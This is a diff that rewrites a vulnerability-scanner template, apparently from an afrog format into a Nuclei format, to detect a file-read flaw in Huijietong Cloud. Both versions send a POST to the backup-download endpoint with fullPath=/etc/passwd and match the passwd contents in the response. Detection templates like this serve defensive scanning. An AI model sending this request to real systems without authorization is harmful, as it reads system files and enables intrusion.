@@ -1,16 +1,23 @@
 id: huijietong-cloud-fileread
-
 info:
-    name: Huijietong Cloud File Read
-    author: zan8in
-    severity: high
+  name: Huijietong Cloud File Read
+  author: princechaddha
+  severity: high
+  tags: huijietong,lfi
 
-rules:
-    r0:
-        request:
-            cache: true
-            method: POST
-            path: /fileDownload?action=downloadBackupFile
-            body: fullPath=/etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/fileDownload?action=downloadBackupFile"
+    body: 'fullPath=/etc/passwd'
+
+    matchers-condition: and
+    matchers:
+
+      - type: regex
+        regex:
+          - "root:.*:0:0"
+
+      - type: status
+        status:
+          - 200
